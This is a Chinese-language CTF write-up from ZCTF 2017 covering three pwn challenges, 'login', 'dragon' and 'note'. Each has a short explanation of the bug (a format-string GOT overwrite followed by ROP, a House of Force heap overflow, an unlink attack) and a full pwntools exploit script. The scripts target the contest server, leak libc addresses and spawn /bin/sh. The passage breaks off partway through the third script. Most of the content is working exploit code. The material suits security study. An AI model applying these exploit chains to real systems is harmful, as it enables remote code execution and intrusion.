    <button id="article-functions-viewtags-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon">
        <i class="material-icons" role="presentation">bookmark</i>
        <span class="visuallyhidden">bookmark</span>
    </button>
    <ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-functions-viewtags-button">
        <li class="mdl-menu__item">
        <a class="post_tag-link" href="/tags/ctf/">ctf</a></li><li class="mdl-menu__item"><a class="post_tag-link" href="/tags/pwn/">pwn</a></li><li class="mdl-menu__item"><a class="post_tag-link" href="/tags/writeup/">writeup</a>
    </ul>
    

    <!-- Share -->
    <button id="article-fuctions-share-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon">
    <i class="material-icons" role="presentation">share</i>
    <span class="visuallyhidden">share</span>
</button>
<ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-fuctions-share-button">
    

    

    <!-- Share Weibo -->
    
        <a class="post_share-link" href="http://service.weibo.com/share/share.php?appkey=&title=ZCTF 2017 write up&url=http://blog.dazzlepppp.cn/2017/02/27/ZCTF-2017-write-up/index.html&pic=&searchPic=false&style=simple" target="_blank">
            <li class="mdl-menu__item">
                شارك على Weibo
            </li>
        </a>
    

    <!-- Share Twitter -->
    
        <a class="post_share-link" href="https://twitter.com/intent/tweet?text=ZCTF 2017 write up&url=http://blog.dazzlepppp.cn/2017/02/27/ZCTF-2017-write-up/index.html&via=DazzleP" target="_blank">
            <li class="mdl-menu__item">
                شارك على Twitter
            </li>
        </a>
    

    <!-- Share Facebook -->
    
        <a class="post_share-link" href="https://www.facebook.com/sharer/sharer.php?u=http://blog.dazzlepppp.cn/2017/02/27/ZCTF-2017-write-up/index.html" target="_blank">
            <li class="mdl-menu__item">
                شارك على Facebook
            </li>
        </a>
    

    <!-- Share Google+ -->
    
        <a class="post_share-link" href="https://plus.google.com/share?url=http://blog.dazzlepppp.cn/2017/02/27/ZCTF-2017-write-up/index.html" target="_blank">
            <li class="mdl-menu__item">
                شارك على Google+
            </li>
        </a>
    

    <!-- Share LinkedIn -->
    

    <!-- Share QQ -->
    

    <!-- Share Telegram -->
    
</ul>

</div>

                

                <!-- Post Content -->
                <div id="post-content" class="mdl-color-text--grey-700 mdl-card__supporting-text fade out">
    
        <h2 id="login"><a href="#login" class="headerlink" title="login"></a>login</h2><p>刚开始看这题的时候有点不知所云，完全不知道是要leak canary还是爆破来做，第二天想到，<code>succ()</code>中<code>sprintf()</code>函数的格式化字符串参数是在栈上的，<br>尝试下用s1修改他,果然成功修改输出s2的格式(第一天的时候就有这个现象了，当时还以为<code>printf()</code>有bug…)<br>然后就是用格式化字符串修改<code>stack_chk_fail@got</code>，原本是想找个ret的gadget，但是很奇怪的是没办法用格式化字符串精确修改，好像每多输出一个字符修改的结果会多2，<br>后来发现只修改一个字节刚好可以把<code>stack_chk_fail@got</code>修改成<code>malloc@plt + 6</code>这样即使修改了canary函数也可以正常返回，然后就可以愉快的做ROP了<br>然后做ROP执行<code>system(&#39;/bin/sh&#39;)</code>的时候老是失败，感觉是因为前面的格式化字符串修改了太多栈的内容影响到了<code>system()</code>,<br>于是转而用syscall执行<code>execve(&#39;/bin/sh&#39;, 0, 0)</code>这里要把ecx,edx都设置为0，然而<code>sprintf()</code>遇到\x00就断了，<br>调试的时候发现执行ROP的时候edx已经为0了，然后在题目给的libc里面找到了这么一个gadget</p>
<pre><code>0x000282d3 : xor ecx, ecx ; pop ebx ; mov eax, ecx ; pop esi ; pop edi ; pop ebp ; ret
</code></pre><p>然后就可以愉快的getshell了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">context.log_level = <span class="string">'debug'</span></div><div class="line"></div><div class="line">main_addr = <span class="number">0x0804878C</span></div><div class="line">stack_chk_fail_got = <span class="number">0x0804A014</span></div><div class="line">malloc_got = <span class="number">0x0804A018</span></div><div class="line">puts_plt = <span class="number">0x080484C0</span></div><div class="line">ret = <span class="number">0x804844e</span></div><div class="line">pop_ret = <span class="number">0x08048465</span></div><div class="line">inc_ecx_ret = <span class="number">0x08048aee</span></div><div class="line">ebx_ret = <span class="number">0x08048465</span></div><div class="line"></div><div class="line"><span class="string">'''</span></div><div class="line">i = 1</div><div class="line">while i &lt; 100:</div><div class="line">    p = process('./login')</div><div class="line">    p.recvuntil('Input the username:')</div><div class="line">    payload = ''</div><div class="line">    payload += p32(stack_chk_fail_got)</div><div class="line">    payload += 'A' * (0x4c)</div><div class="line">    payload += p32(main_addr)</div><div class="line">    payload += p32(stack_chk_fail_got) * 9 + 'AA'</div><div class="line">    payload += 'KK:%' + str(i) + '$x'</div><div class="line">    p.send(payload + '\n')</div><div class="line">    p.recvuntil('Input the password:')</div><div class="line">    p.send('123\n')</div><div class="line">    p.recvuntil("$x:")</div><div class="line">    data = int(p.recvuntil(':', drop = True), 16)</div><div class="line">    if data == stack_chk_fail_got:</div><div class="line">        print "succ", i</div><div class="line">        exit(0)</div><div class="line">    p.close()</div><div class="line">    i = i + 1</div><div class="line">'''</div><div class="line"></div><div class="line"><span class="comment">#p = process('./login')</span></div><div class="line">p = remote(<span class="string">'58.213.63.30'</span>, <span class="number">4002</span>)</div><div class="line"></div><div class="line">p.recvuntil(<span class="string">'Input the username:'</span>)</div><div class="line"></div><div class="line">payload = <span class="string">''</span></div><div class="line">payload += p32(stack_chk_fail_got)</div><div class="line">payload += p32(stack_chk_fail_got + <span class="number">1</span>) * <span class="number">19</span></div><div class="line">payload += p32(main_addr)</div><div class="line">payload += p32(stack_chk_fail_got) * <span class="number">9</span> + <span class="string">'AA'</span></div><div class="line">payload += <span class="string">'K:%47c'</span></div><div class="line">payload += <span class="string">'%10$hhn'</span></div><div class="line"></div><div class="line">p.send(payload + <span class="string">'\n'</span>)</div><div class="line">p.recvuntil(<span class="string">'Input the password:'</span>)</div><div class="line">p.send(<span class="string">'123AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n'</span>)</div><div class="line">p.recvuntil(<span class="string">'Input the username:'</span>)</div><div class="line"></div><div class="line">payload = <span class="string">''</span></div><div class="line">payload += <span class="string">'A'</span> * (<span class="number">0x4c</span> + <span class="number">4</span>)</div><div class="line">payload += p32(puts_plt)</div><div class="line">payload += p32(pop_ret)</div><div class="line">payload += p32(malloc_got)</div><div class="line">payload += p32(main_addr)</div><div class="line"></div><div class="line">p.send(payload + <span class="string">'\n'</span>)</div><div class="line">p.recvuntil(<span class="string">'Input the password:'</span>)</div><div class="line">p.send(<span class="string">'123AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n'</span>)</div><div class="line">p.recvuntil(<span class="string">'Login successful!\n'</span>)</div><div class="line"></div><div class="line">p.recvuntil(<span class="string">'\n'</span>)</div><div class="line">malloc_addr = u32(p.recvn(<span class="number">4</span>))</div><div class="line">log.info(<span class="string">'malloc() addr: '</span> + hex(malloc_addr))</div><div class="line"></div><div class="line">libc = ELF(<span class="string">'./libc-2.19.so'</span>)</div><div class="line"><span class="comment">#libc = ELF('./local.libc32')</span></div><div class="line"></div><div class="line">offset_malloc = libc.symbols[<span class="string">'malloc'</span>]</div><div class="line">offset_system = libc.symbols[<span class="string">'system'</span>]</div><div class="line">offset_binsh = next(libc.search(<span class="string">'/bin/sh'</span>))</div><div class="line"></div><div class="line">libc_base = malloc_addr - offset_malloc</div><div class="line">system_addr = libc_base + offset_system</div><div class="line">binsh_addr = libc_base + offset_binsh</div><div class="line"></div><div class="line"><span class="comment">#int80 = libc_base + 0x000B14DD</span></div><div class="line">int80 = libc_base + <span class="number">0x000B4EBB</span></div><div class="line">xorecx_ebx_pppop_ret = libc_base + <span class="number">0x000282d3</span></div><div class="line"></div><div class="line">payload = <span class="string">''</span></div><div class="line">payload += <span class="string">'A'</span> * (<span class="number">0x4c</span> + <span class="number">4</span>)</div><div class="line">payload += p32(xorecx_ebx_pppop_ret)</div><div class="line">payload += p32(binsh_addr)</div><div class="line">payload += p32(<span class="number">0xdeadbeef</span>) * <span class="number">3</span></div><div class="line">payload += p32(int80)</div><div class="line"></div><div class="line">p.send(payload + <span class="string">'\n'</span>)</div><div class="line">p.recvuntil(<span class="string">'Input the password:'</span>)</div><div class="line">p.send(<span class="string">'123AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n'</span>)</div><div class="line">p.recvuntil(<span class="string">'Login successful!\n'</span>)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
<h2 id="dragon"><a href="#dragon" class="headerlink" title="dragon"></a>dragon</h2><p>程序漏洞在申请堆块存放content的时候是根据输入字符串大小申请堆块的，然是<code>edit()</code>函数固定修改32个字节，这样就存在溢出了<br>利用House of Force这个技巧，溢出修改Top Chunk的大小，而且程序申请堆块存放name的时候，也只是检查长度是否小于32，并没有检查是否为负数，<br>这样就可以申请大小为负的堆块，然后分配到一个指向bss段中的list，然后就可以任意读写了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">context.log_level = <span class="string">'debug'</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">New</span><span class="params">(p, size, name, content)</span>:</span></div><div class="line">    p.recvuntil(<span class="string">'&gt;&gt; '</span>)</div><div class="line">    p.send(<span class="string">'1\n'</span>)</div><div class="line">    p.recvuntil(<span class="string">'please input note name size: '</span>)</div><div class="line">    p.send(str(size) + <span class="string">'\n'</span>)</div><div class="line">    p.recvuntil(<span class="string">'please input note name: '</span>)</div><div class="line">    p.send(name)</div><div class="line">    p.recvuntil(<span class="string">'please input note content: '</span>)</div><div class="line">    p.send(content)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">List</span><span class="params">(p, idx)</span>:</span></div><div class="line">    p.recvuntil(<span class="string">'&gt;&gt; '</span>)</div><div class="line">    p.send(<span class="string">'4\n'</span>)</div><div class="line">    p.recvuntil(<span class="string">'input note id: '</span>)</div><div class="line">    p.send(str(idx) + <span class="string">'\n'</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">Edit</span><span class="params">(p, idx, content)</span>:</span></div><div class="line">    p.recvuntil(<span class="string">'&gt;&gt; '</span>)</div><div class="line">    p.send(<span class="string">'2\n'</span>)</div><div class="line">    p.recvuntil(<span class="string">'input note id: '</span>)</div><div class="line">    p.send(str(idx) + <span class="string">'\n'</span>)</div><div class="line">    p.recvuntil(<span class="string">'please input new note content: '</span>)</div><div class="line">    p.send(content)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">Delete</span><span class="params">(p, idx)</span>:</span></div><div class="line">    p.recvuntil(<span class="string">'&gt;&gt; '</span>)</div><div class="line">    p.send(<span class="string">'3\n'</span>)</div><div class="line">    p.recvuntil(<span class="string">'input note id: '</span>)</div><div class="line">    p.send(str(idx) + <span class="string">'\n'</span>)</div><div class="line"></div><div class="line"><span class="comment">#p = process('./dragon')</span></div><div class="line">p = remote(<span class="string">'58.213.63.30'</span>, <span class="number">11501</span>)</div><div class="line"></div><div class="line">New(p, <span class="number">0x20</span>, <span class="string">'A'</span> * <span class="number">0x10</span>, <span class="string">'B'</span> * <span class="number">0x20</span>)</div><div class="line">New(p, <span class="number">0x20</span>, <span class="string">'C'</span> * <span class="number">0x10</span>, <span class="string">'D'</span> * <span class="number">0x20</span>)</div><div class="line"></div><div class="line">Delete(p, <span class="number">0</span>)</div><div class="line">Delete(p, <span class="number">1</span>)</div><div class="line"></div><div class="line">payload = <span class="string">''</span></div><div class="line">payload += p64(<span class="number">0x602058</span>)</div><div class="line">payload += p64(<span class="number">0x00</span>)</div><div class="line">payload += p64(<span class="number">0x602058</span>)</div><div class="line"></div><div class="line">New(p, <span class="number">0x10</span>, <span class="string">'A'</span> * <span class="number">0x10</span>, <span class="string">'A'</span> * <span class="number">0x20</span>)</div><div class="line">Edit(p, <span class="number">0</span>, payload)</div><div class="line"></div><div class="line">List(p, <span class="number">0</span>)</div><div class="line">p.recvuntil(<span class="string">'A'</span> * <span class="number">0x10</span>)</div><div class="line">data = p.recvuntil(<span class="string">'\n'</span>, drop = <span class="keyword">True</span>)</div><div class="line"><span class="keyword">if</span> len(data) &lt; <span class="number">4</span>:</div><div class="line">    log.error(<span class="string">"maybe error!"</span>)</div><div class="line">    exit(<span class="number">0</span>)</div><div class="line"></div><div class="line">heap_addr = u64(data.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</div><div class="line">log.info(<span class="string">"heap addr : "</span> + hex(heap_addr))</div><div class="line"></div><div class="line">fake_note = heap_addr + <span class="number">0x80</span></div><div class="line"></div><div class="line">New(p, <span class="number">0x20</span>, <span class="string">'E'</span> * <span class="number">0x20</span>, <span class="string">'F'</span> * <span class="number">0x20</span>)</div><div class="line">New(p, <span class="number">0x18</span>, <span class="string">'G'</span> * <span class="number">0x18</span>, <span class="string">'H'</span> * <span class="number">0x17</span> + <span class="string">'\n'</span>)</div><div class="line"></div><div class="line">Edit(p, <span class="number">2</span>, <span class="string">'H'</span> * <span class="number">0x18</span> + p64(<span class="number">0xffffffffffffffff</span>))</div><div class="line"></div><div class="line">top_chunk = heap_addr + <span class="number">0x148</span></div><div class="line">offset = <span class="number">0x00000000006020e0</span> - top_chunk</div><div class="line"></div><div class="line">p.recvuntil(<span class="string">'&gt;&gt; '</span>)</div><div class="line">p.send(<span class="string">'1\n'</span>)</div><div class="line">p.recvuntil(<span class="string">'please input note name size: '</span>)</div><div class="line">p.send(str(offset - <span class="number">0x30</span>) + <span class="string">'\n'</span>)</div><div class="line">p.recvuntil(<span class="string">'please input note content: '</span>)</div><div class="line">p.send(p64(fake_note))</div><div class="line"></div><div class="line">List(p, <span class="number">2</span>)</div><div class="line">p.recvuntil(<span class="string">'name: '</span>)</div><div class="line">data = p.recvn(<span class="number">6</span>)</div><div class="line">libc_start_main_addr = u64(data.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</div><div class="line">log.info(<span class="string">"__libc_start_main() addr: "</span> + hex(libc_start_main_addr))</div><div class="line"></div><div class="line"><span class="comment">#libc = ELF('./local.libc64')</span></div><div class="line">libc = ELF(<span class="string">'./libc-2.19.so'</span>)</div><div class="line"></div><div class="line">offset_libc_start_main = libc.symbols[<span class="string">'__libc_start_main'</span>]</div><div class="line">offset_system = libc.symbols[<span class="string">'system'</span>]</div><div class="line"></div><div class="line">libc_base = libc_start_main_addr - offset_libc_start_main</div><div class="line">system_addr = libc_base + offset_system</div><div class="line"></div><div class="line">payload = <span class="string">''</span></div><div class="line">payload += p64(<span class="number">0x602018</span>)</div><div class="line">payload += p64(<span class="number">0x00</span>)</div><div class="line">payload += p64(<span class="number">0x602018</span>)</div><div class="line"></div><div class="line">Edit(p, <span class="number">0</span>, payload)</div><div class="line"></div><div class="line">Edit(p, <span class="number">2</span>, p64(system_addr))</div><div class="line"></div><div class="line">New(p, <span class="number">0x20</span>, <span class="string">'SH'</span>, <span class="string">'/bin/sh\x00'</span>)</div><div class="line"></div><div class="line">Delete(p, <span class="number">4</span>)</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
<h2 id="note"><a href="#note" class="headerlink" title="note"></a>note</h2><p><code>note</code>结构体中有<code>Title</code>和<code>content</code>，特别没良心的不给<code>Show</code>功能，<br>漏洞点在<code>EditContent</code>功能一次只能修改48个字节的<code>content</code>，但是允许从<code>content</code>后部开始修改，<br>程序使用的是talloc，网上搜索了一波发现貌似还有点复杂，不过调试发现talloc的chunk只是拓展了ptmalloc的堆块结构，<br>而且释放内存实际上最终还是要执行ptmalloc的<code>free()</code>，所以完全可以当作老式的linux exploit来搞<br>利用溢出来做unlink attack，然后我们就的到了一个指向在<code>bss</code>段的<code>note list</code>的指针，修改<code>_talloc_free@got</code>为<code>puts@plt + 6</code>，这样就把<code>Delete()</code>变成了<code>Show</code><br>但这样并不能leak libc,因为在程序释放内存之前会对堆块做检查，这样就无法直接读<code>got</code>，只能leak堆上的<code>main_arena</code>指针了<br>在这之前要先得到堆地址，<code>note</code>结构体中，<code>Title</code>紧跟着<code>content_ptr</code>，把<code>Title</code>填满就可以leak heap了，<br>但是程序的<code>ChangeTitle()</code>函数读取输入的时候会在输入的末尾补<code>\x00</code>，而且非常诡异的是只要把Title填满，下一次<code>atoi()</code>函数的结果一定会为0，程序直接退出<br>后来发现<code>EditContent()</code>是不会在输入末尾补<code>\x00</code>的，然后利用之前unlink的到的指针修改note list，将其作为一个<code>note</code>结构体，<br>这样就可以用<code>EditContent()</code>的方法修改某个note的<code>Title</code>,然后打印出来就可以的到堆的地址，<br>之后要打印出堆上的<code>main_arena</code>指针，但是<code>main_arena</code>指针的位置在堆块的头部，并不在<code>Title</code>的位置，无法通过<code>Delete()</code>函数的检查，<br>所以在这之前，利用之前指向note list的指针，多次修改堆内容，将<code>main_arena</code>指针前面的内容修改成一个talloc的chunk头部，然后就可以通过检查，将<code>main_arena</code>的指针打印出来<br>然后就可以修改<code>atoi@got</code>为<code>system()</code>，输入<code>/bin/sh</code>就可以getshell了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">context.log_level = <span class="string">'debug'</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">New</span><span class="params">(p, size, title, content)</span>:</span></div><div class="line">    p.recvuntil(<span class="string">'&gt;&gt;\n'</span>)</div><div class="line">    p.send(<span class="string">'1\n'</span>)</div><div class="line">    p.recvuntil(<span class="string">'Input the title:\n'</span>)</div><div class="line">    p.send(title)</div><div class="line">    p.recvuntil(<span class="string">'Input the size of content:\n'</span>)</div><div class="line">    p.send(str(size) + <span class="string">'\n'</span>)</div><div class="line">    p.recvuntil(<span class="string">'Input the content:\n'</span>)</div><div class="line">    p.send(content)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">Edit</span><span class="params">(p, idx, offset, content)</span>:</span></div><div class="line">    p.recvuntil(<span class="string">'&gt;&gt;\n'</span>)</div><div class="line">    p.send(<span class="string">'3\n'</span>)</div><div class="line">    p.recvuntil(<span class="string">'Input the id of the note:'</span>)</div><div class="line">    p.send(str(idx) + <span class="string">'\n'</span>)</div><div class="line">    p.recvuntil(<span class="string">'Enter the start offset:'</span>)</div><div class="line">    p.send(str(offset) + <span class="string">'\n'</span>)</div><div class="line">    p.recvuntil(<span class="string">'Enter the new content:'</span>)</div><div class="line">    p.send(content)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">Delete</span><span class="params">(p, idx)</span>:</span></div><div class="line">    p.recvuntil(<span class="string">'&gt;&gt;'</span>)</div><div class="line">    p.send(<span class="string">'4\n'</span>)</div><div class="line">    p.recvuntil(<span class="string">'Input the id of the note:'</span>)</div><div class="line">    p.send(str(idx) + <span class="string">'\n'</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">ChangeTitle</span><span class="params">(p, idx, title)</span>:</span></div><div class="line">    p.recvuntil(<span class="string">'&gt;&gt;'</span>)</div><div class="line">    p.send(<span class="string">'5\n'</span>)</div><div class="line">    p.recvuntil(<span class="string">'Input the id of the note:'</span>)</div><div class="line">    p.send(str(idx) + <span class="string">'\n'</span>)</div><div class="line">    p.recvuntil(<span class="string">'Enter the new title:'</span>)</div><div class="line">    p.send(title)</div><div class="line"></div><div class="line"><span class="comment">#p = process('./note')</span></div><div class="line">p = remote(<span class="string">'58.213.63.30'</span>, <span class="number">4003</span>)</div><div class="line"></div><div class="line">ptr = <span class="number">0x6020c0</span> + <span class="number">0x08</span> * <span class="number">8</span></div><div class="line">fake_fd = ptr - <span class="number">0x18</span></div><div class="line">fake_bk = fake_fd + <span class="number">0x08</span></div><div class="line"></div><div class="line">payload = <span class="string">''</span></div><div class="line">payload += p64(<span class="number">0x00</span>)</div><div class="line">payload += p64(<span class="number">0x121</span>)</div><div class="line">payload += p64(fake_fd)</div><div class="line">payload += p64(fake_bk)[:<span class="number">3</span>]</div><div class="line"></div><div class="line">New(p, <span class="number">128</span>, <span class="string">'Z'</span> * <span class="number">16</span> + <span class="string">'\n'</span>, <span class="string">'Z'</span> * <span class="number">64</span> + <span class="string">'\n'</span>)</div><div class="line">New(p, <span class="number">128</span>, <span class="string">'Z'</span> * <span class="number">16</span> + <span class="string">'\n'</span>, <span class="string">'Z'</span> * <span class="number">64</span> + <span class="string">'\n'</span>)</div><div class="line">New(p, <span class="number">128</span>, <span class="string">'Z'</span> * <span class="number">16</span> + <span class="string">'\n'</span>, <span class="string">'Z'</span> * <span class="number">64</span> + <span class="string">'\n'</span>)</div><div class="line">New(p, <span class="number">128</span>, <span class="string">'Z'</span> * <span class="number">16</span> + <span class="string">'\n'</span>, <span class="string">'Z'</span> * <span class="number">64</span> + <span class="string">'\n'</span>)</div><div class="line">New(p, <span class="number">128</span>, <span class="string">'Z'</span> * <span class="number">16</span> + <span class="string">'\n'</span>, <span class="string">'Z'</span> * <span class="number">64</span> + <span class="string">'\n'</span>)</div><div class="line">New(p, <span class="number">128</span>, <span class="string">'Z'</span> * <span class="number">16</span> + <span class="string">'\n'</span>, <span class="string">'Z'</span> * <span class="number">64</span> + <span class="string">'\n'</span>)</div><div class="line">New(p, <span class="number">128</span>, <span class="string">'Z'</span> * <span class="number">16</span> + <span class="string">'\n'</span>, <span class="string">'Z'</span> * <span class="number">64</span> + <span class="string">'\n'</span>)</div><div class="line">New(p, <span class="number">128</span>, <span class="string">'Z'</span> * <span class="number">16</span> + <span class="string">'\n'</span>, <span class="string">'Z'</span> * <span class="number">64</span> + <span class="string">'\n'</span>)</div><div class="line">New(p, <span class="number">128</span>, payload + <span class="string">'\n'</span>, <span class="string">'B'</span> * <span class="number">64</span> + <span class="string">'\n'</span>)</div><div class="line">New(p, <span class="number">128</span>, <span class="string">'C'</span> * <span class="number">16</span> + <span class="string">'\n'</span>, <span class="string">'D'</span> * <span class="number">64</span> + <span class="string">'\n'</span>)</div><div class="line">New(p, <span class="number">128</span>, <span class="string">'E'</span> * <span class="number">16</span> + <span class="string">'\n'</span>, <span class="string">'F'</span> * <span class="number">64</span> + <span class="string">'\n'</span>)</div><div class="line"></div><div class="line">payload = <span class="string">''</span></div><div class="line">payload += <span class="string">'A'</span></div><div class="line">payload += p64(<span class="number">0x120</span>)</div><div class="line">payload += p64(<span class="number">0xa0</span>)</div><div class="line"></div><div class="line">Edit(p, <span class="number">8</span>, <span class="number">127</span>, payload + <span class="string">'\n'</span>)</div><div class="line"></div><div class="line">Delete(p, <span class="number">9</span>)</div><div class="line"></div><div class="line">payload = <span class="string">''</span></div><div class="line">payload += p64(<span class="number">0x6020c0</span>)</div><div class="line">payload += p64(<span class="number">0x601fd8</span>)</div><div class="line">payload += p64(<span class="number">0x602048</span>)</div><div class="line">payload += p64(<span class="number">0x602008</span>)[:<span class="number">3</span>]</div><div class="line"></div><div class="line">ChangeTitle(p, <span class="number">8</span>, payload + <span class="string">'\n'</span>)</div><div class="line"></div><div class="line">ChangeTitle(p, <span class="number">7</span>, p64(<span class="number">0x4007e6</span>) + <span class="string">'\n'</span>)</div><div class="line"></div><div class="line">Edit(p, <span class="number">5</span>, <span class="number">1</span>, <span class="string">'A'</span> * <span class="number">0x1f</span> + <span class="string">'\n'</span>)</div><div class="line"></div><div class="line">Delete(p, <span class="number">4</span>)</div><div class="line"></div><div class="line">p.recvuntil(<span class="string">'A'</span> * <span class="number">0x1f</span>)</div><div class="line">data = p.recvuntil(<span class="string">'Delete success'</span>, drop = 